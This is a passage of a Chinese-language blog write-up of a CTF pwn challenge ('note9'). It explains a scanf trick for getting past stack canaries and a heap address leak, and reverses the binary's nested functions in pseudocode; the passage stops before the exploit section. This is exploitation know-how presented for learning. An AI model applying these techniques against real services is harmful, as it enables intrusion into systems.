@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>pwnhub-12月内部赛pwn-note9-wp - roderick - record and learn!</title><meta name="author" content="roderick">
+<meta name="author-link" content="https://www.roderickchan.cn">
+<meta name="description" content="总结 刚开始以为是虚拟机的题，后来发现有点像状态机。函数之间互相嵌套，看着看着差点把自己给绕进去了&hellip;&hellip;不过这道题其" /><meta name="keywords" content='pwn' /><meta itemprop="name" content="pwnhub-12月内部赛pwn-note9-wp">
+<meta itemprop="description" content="总结 刚开始以为是虚拟机的题，后来发现有点像状态机。函数之间互相嵌套，看着看着差点把自己给绕进去了&hellip;&hellip;不过这道题其"><meta itemprop="datePublished" content="2021-12-22T21:36:48+08:00" />
+<meta itemprop="dateModified" content="2021-12-22T21:36:48+08:00" />
+<meta itemprop="wordCount" content="1948"><meta itemprop="image" content="https://www.roderickchan.cn/"/>
+<meta itemprop="keywords" content="pwn," /><meta property="og:title" content="pwnhub-12月内部赛pwn-note9-wp" />
+<meta property="og:description" content="总结 刚开始以为是虚拟机的题，后来发现有点像状态机。函数之间互相嵌套，看着看着差点把自己给绕进去了&hellip;&hellip;不过这道题其" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" /><meta property="og:image" content="https://www.roderickchan.cn/"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-22T21:36:48+08:00" />
+<meta property="article:modified_time" content="2021-12-22T21:36:48+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://www.roderickchan.cn/"/>
+
+<meta name="twitter:title" content="pwnhub-12月内部赛pwn-note9-wp"/>
+<meta name="twitter:description" content="总结 刚开始以为是虚拟机的题，后来发现有点像状态机。函数之间互相嵌套，看着看着差点把自己给绕进去了&hellip;&hellip;不过这道题其"/>
+<meta name="application-name" content="roderick - record and learn!">
+<meta name="apple-mobile-web-app-title" content="roderick - record and learn!"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.roderickchan.cn/zh-cn/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp/" /><link rel="prev" href="https://www.roderickchan.cn/zh-cn/2021-12-11-isitdtu2019-babyshellcode/" /><link rel="next" href="https://www.roderickchan.cn/zh-cn/2021-12-27-twctf-online-2019-asterisk-alloc/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "pwnhub-12月内部赛pwn-note9-wp",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/www.roderickchan.cn\/zh-cn\/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp\/"
+    },"image": ["https:\/\/www.roderickchan.cn\/images\/Apple-Devices-Preview.jpg"],"genre": "posts","keywords": "pwn","wordcount":  1948 ,
+    "url": "https:\/\/www.roderickchan.cn\/zh-cn\/2021-12-22-pwnhub-12%E6%9C%88%E5%86%85%E9%83%A8%E8%B5%9Bpwn-note9-wp\/","datePublished": "2021-12-22T21:36:48+08:00","dateModified": "2021-12-22T21:36:48+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+      "@type": "Organization",
+      "name": "roderick","logo": "https:\/\/www.roderickchan.cn\/logo.png"},"author": {
+        "@type": "Person",
+        "name": "roderick"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper" data-github-corner="right">
+    <div class="header-title">
+      <a href="/zh-cn/" title="roderick - record and learn!"><img loading="lazy" src="/logo.png" srcset="/logo.png, /logo.png 1.5x, /logo.png 2x" sizes="auto" data-title="roderick - record and learn!" data-alt="roderick - record and learn!" class="logo" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/><span class="header-title-text">roderick&#39;s blog</span></a><span id="typeit-header-subtitle-desktop" class="typeit header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item text-center">
+              <a
+                class="menu-link"
+                href="/zh-cn/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/zh-cn/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/zh-cn/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/zh-cn/tutorial/pwncli/"
+                
+                
+              ><i class="fa-solid fa-book fa-fw fa-sm" aria-hidden="true"></i> pwncli教程</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/zh-cn/friends/"
+                title="友情链接"
+                
+              ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/zh-cn/about/"
+                
+                
+              ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li><li class="menu-item language-switch">
+            <span role="button" aria-label="选择语言" title="选择语言"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+            <ul class="sub-menu"><li class="menu-item">没有更多翻译</li></ul>
+          </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/zh-cn/" title="roderick - record and learn!"><img loading="lazy" src="/logo.png" srcset="/logo.png, /logo.png 1.5x, /logo.png 2x" sizes="auto" data-title="/logo.png" data-alt="/logo.png" class="logo" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/><span class="header-title-text">roderick&#39;s blog</span></a><span id="typeit-header-subtitle-mobile" class="typeit header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="/zh-cn/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 所有文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/zh-cn/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/zh-cn/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/zh-cn/tutorial/pwncli/"
+                  
+                  
+                ><i class="fa-solid fa-book fa-fw fa-sm" aria-hidden="true"></i> pwncli教程</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/zh-cn/friends/"
+                  title="友情链接"
+                  
+                ><i class="fa-solid fa-users fa-fw fa-sm" aria-hidden="true"></i> 友链</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/zh-cn/about/"
+                  
+                  
+                ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li
+              class="menu-item text-center"
+            ><a
+                  class="menu-link"
+                  href="https://github.com/RoderickChan"
+                  title="GitHub"
+                  rel="noopener noreferrer" target="_blank"
+                ><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
+              <span role="button" aria-label="选择语言" title="选择语言">简体中文<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+              <select class="language-select" onchange="location = this.value;"><option disabled>没有更多翻译</option></select>
+            </span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/zh-cn/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">pwnhub-12月内部赛pwn-note9-wp</li>
+    </ol>
+  </nav><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>pwnhub-12月内部赛pwn-note9-wp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://www.roderickchan.cn" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img loading="lazy" src="https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&amp;d=mp" srcset="https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&amp;d=mp, https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&amp;d=mp 1.5x, https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&amp;d=mp 2x" sizes="auto" data-title="roderick" data-alt="roderick" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;roderick</a></span>
+          <span class="post-category">收录于 <a href="/zh-cn/categories/pwn-wp/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> pwn-wp</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2021-12-22 21:36:48"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2021-12-22">2021-12-22</time></span>&nbsp;<span title="更新于 2021-12-22 21:36:48"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2021-12-22">2021-12-22</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1948 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="pwnhub-12月内部赛pwn-note9-wp">
+              <i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+            </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#总结">总结</a></li>
+            <li><a href="#题目分析">题目分析</a>
+              <ul>
+                <li><a href="#checksec">checksec</a></li>
+                <li><a href="#函数分析">函数分析</a>
+                  <ul>
+                    <li><a href="#main">main</a></li>
+                    <li><a href="#sub_14d7">sub_14D7</a></li>
+                    <li><a href="#sub_12cd">sub_12CD</a></li>
+                    <li><a href="#sub_19d6">sub_19D6</a></li>
+                    <li><a href="#sub_2f1d">sub_2F1D</a></li>
+                    <li><a href="#sub_1ed8show_ptr">sub_1ED8(show_ptr)</a></li>
+                    <li><a href="#sub_2907">sub_2907</a></li>
+                    <li><a href="#sub_2cfb">sub_2CFB</a></li>
+                    <li><a href="#sub_2514">sub_2514</a></li>
+                    <li><a href="#sub_2f07">sub_2F07</a></li>
+                  </ul>
+                </li>
+                <li><a href="#漏洞点">漏洞点</a></li>
+              </ul>
+            </li>
+            <li><a href="#利用思路">利用思路</a></li>
+            <li><a href="#exp">EXP</a></li>
+            <li><a href="#引用与参考">引用与参考</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><div class="details admonition note open">
+      <div class="details-summary admonition-title">
+        <i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
+      </div>
+      <div class="details-content">
+        <div class="admonition-content">本文最后更新于 2021-12-22，文中内容可能已过时。</div>
+      </div>
+    </div><h3 id="总结">总结</h3>
+<p>刚开始以为是虚拟机的题，后来发现有点像状态机。函数之间互相嵌套，看着看着差点把自己给绕进去了&hellip;&hellip;不过这道题其实就是披着逆向的栈溢出的题，只不过需要用<code>scanf</code>绕过<code>canary</code>。做完本题后，总结如下：</p>
+<ul>
+<li><code>scanf</code>绕过<code>canary</code>，这个算是基础考点，如果是<code>%d</code>，可以用<code>-</code>号绕过，如果是<code>%u</code>，可以用<code>+</code>等特殊字符绕过，这样就不会覆盖待写入地址的原有内容。</li>
+<li>高版本的<code>IDA</code>有一个快捷键<code>%</code>，可以进行花括号跳转，这样就不会看错位了；另外<code>IDA 7.0</code>有一个<code>hexlight</code>插件，可以高亮显示括号，可以从<a href="https://bbs.pediy.com/thread-226099-1.htm"target="_blank" rel="external nofollow noopener noreferrer">这里下载<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>。</li>
+<li>可根据<code>unsorted bin</code>的<code>fd</code>或<code>bk</code>指针残留的地址猜测<code>libc</code>的版本。附件没有给<code>libc</code>，我是根据这个地址猜出来<code>libc</code>版本是<code>2.31</code>，后来验证了一下，的确是<code>libc-2.31.so BuildID[sha1]=099b9225bcb0d019d9d60884be583eb31bb5f44e</code>。</li>
+<li><code>snprintf</code>的返回值是待写入的字符串的长度，而不是指定的那个<code>size</code>的值。例如<code>snprintf(dest, 4, &quot;%s&quot;, &quot;123456789&quot;);</code>的返回值是<code>strlen(&quot;123456789&quot;)</code>，是<code>9</code>而不是<code>4</code>。</li>
+<li>做题时眼神要好，刚开始看错位了一个大括号，一度怀疑题目是不是出错了&hellip;&hellip;</li>
+</ul>
+<!-- more -->
+<h3 id="题目分析">题目分析</h3>
+<h4 id="checksec">checksec</h4>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225152970.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225152970.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225152970.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225152970.png 2x" sizes="auto" data-title="image-20211222225152970" data-alt="image-20211222225152970" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h4 id="函数分析">函数分析</h4>
+<p>很多函数中加了很多地址无关代码和数据，做题的时候忽视这些变量即可，和主流程没有任何关系，不过刚开始肯定是要踩坑的，以为这些变量很重要&hellip;&hellip;</p>
+<h5 id="main">main</h5>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225747924.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225747924.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225747924.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225747924.png 2x" sizes="auto" data-title="image-20211222225747924" data-alt="image-20211222225747924" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>有些函数我已重命名，接下来会一个一个分析</p>
+<h5 id="sub_14d7">sub_14D7</h5>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225532526.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225532526.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225532526.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222225532526.png 2x" sizes="auto" data-title="image-20211222225532526" data-alt="image-20211222225532526" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>初始化函数，只需要看框出来的地方即可。一顿操作后，得到了一个<code>0x500</code>大小的<code>unsorted bin chunk</code>。</p>
+<h5 id="sub_12cd">sub_12CD</h5>
+<p>这个地方函数识别有问题，可以在这个<code>0x12cd</code>地址，先按下<code>u</code>键<code>undefine</code>，再按下<code>c</code>转为汇编代码，再按<code>p</code>提取函数，发现其实就是设置沙盒。检测一波：</p>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230005651.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230005651.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230005651.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230005651.png 2x" sizes="auto" data-title="image-20211222230005651" data-alt="image-20211222230005651" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<h5 id="sub_19d6">sub_19D6</h5>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230255510.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230255510.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230255510.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230255510.png 2x" sizes="auto" data-title="image-20211222230255510" data-alt="image-20211222230255510" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>流程为：</p>
+<ul>
+<li>读取用户输入的大小，调用<code>malloc</code></li>
+<li>分配堆内存，然后读取用户输入</li>
+<li>读取用户输入的<code>16</code>个整数，存储在<code>0x66E0</code>处的数组。这里我直接把数组的元素依次命名为<code>a0, a1, ...a15</code>。</li>
+</ul>
+<h5 id="sub_2f1d">sub_2F1D</h5>
+<p>开始处理的入口函数，也就是从这里开始，函数有点绕了。这里我用<code>python</code>的缩进来分析各个分支。</p>
+<p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230825905.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230825905.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230825905.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20211222230825905.png 2x" sizes="auto" data-title="image-20211222230825905" data-alt="image-20211222230825905" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
+<p>提取主要流程如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sub_2F1D</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">a0</span> <span class="o">&lt;</span> <span class="n">a15</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">a1</span> <span class="o">&lt;</span> <span class="n">a13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">a2</span> <span class="o">&gt;</span> <span class="n">a10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">a3</span> <span class="o">!=</span> <span class="n">a11</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">					<span class="n">a4</span> <span class="o">&lt;</span> <span class="n">a12</span> <span class="ow">and</span> <span class="n">a5</span> <span class="o">&lt;</span> <span class="n">a14</span> <span class="ow">and</span> <span class="n">a6</span> <span class="o">+</span> <span class="n">a7</span> <span class="o">&gt;</span> <span class="n">a8</span> <span class="o">+</span> <span class="n">a9</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">						<span class="n">read_input</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">					<span class="n">show_ptr</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">					<span class="k">return</span>
+</span></span><span class="line"><span class="cl">				<span class="n">sub_2907</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">			<span class="n">sub_2514</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="n">sub_20F7</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后续的函数都可以这么分析，这样整理后流程看起来就清晰多了。这里可以发现，在<code>show_ptr</code>后有个<code>return</code>，由于程序使用的是<code>malloc</code>，且<code>read_input</code>函数里面也没有<code>\x00</code>截断，因此此处可以泄露出<code>main_arena+XX</code>的地址。</p>
+<p>接下来直接给出其他函数的主要流程。</p>
+<h5 id="sub_1ed8show_ptr">sub_1ED8(show_ptr)</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sub_1ED8</span><span class="p">(</span><span class="n">show_ptr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">a4</span> <span class="o">&gt;</span> <span class="n">a12</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">a5</span> <span class="o">&lt;</span> <span class="n">a14</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">a6</span> <span class="o">+</span> <span class="n">a7</span> <span class="o">==</span> <span class="n">a8</span> <span class="o">+</span> <span class="n">a9</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">puts</span><span class="p">(</span><span class="n">ptr</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h5 id="sub_2907">sub_2907</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">sub_2907</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">a1</span> <span class="o">&lt;</span> <span class="n">a13</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">a2</span> <span class="o">&gt;</span> <span class="n">a10</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf1</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="n">buf1</span><span class="p">:</span> <span class="mh">0x60C0</span>
+</span></span><span class="line"><span class="cl">			<span class="n">a3</span> <span class="o">==</span> <span class="n">a11</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">a4</span> <span class="o">&gt;</span> <span class="n">a12</span><span class="p">:</span>
